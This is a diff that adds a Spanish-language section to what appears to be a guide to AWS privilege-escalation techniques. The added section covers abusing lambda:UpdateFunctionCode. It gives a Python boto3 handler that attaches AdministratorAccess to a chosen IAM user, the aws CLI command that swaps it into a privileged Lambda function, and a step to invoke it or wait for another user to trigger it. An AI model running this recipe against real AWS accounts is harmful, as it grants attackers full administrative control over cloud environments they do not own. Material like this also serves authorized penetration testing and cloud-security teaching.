@@ -67,4 +67,27 @@ A diferencia del caso anterior, un usuario que pueda crear una lambda pero no in
 
 
 
-# Continuara...
+# EditExistingLambdaFunctionWithRole
+
+Un atacante puede abusar de sus permisos para cambiar el código de una lambda que posea permisos privilegiados y forzarla a realizar acciones que le permitan elevar privilegios.
+
+#### Permiso necesario
+
+- lambda:UpdateFunctionCode
+
+
+### Ejecución
+
+1) Buscamos una función lambda con privilegios.
+2) Creamos una nueva función lambda que nos otorgue privilegios elevados.
+
+        import boto3
+        def lambda_handler(event, context):
+          client = boto3.client('iam')
+          response = client.attach_user_policy(UserName='<user>', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+          return response
+3) Updateamos la lambda
+
+        aws lambda update-function-code --function-name <lambda> --zip-file fileb://function.zip --profile <perfil>
+
+4) Invocamos la lambda o esperamos que otro usuario la haga correr.
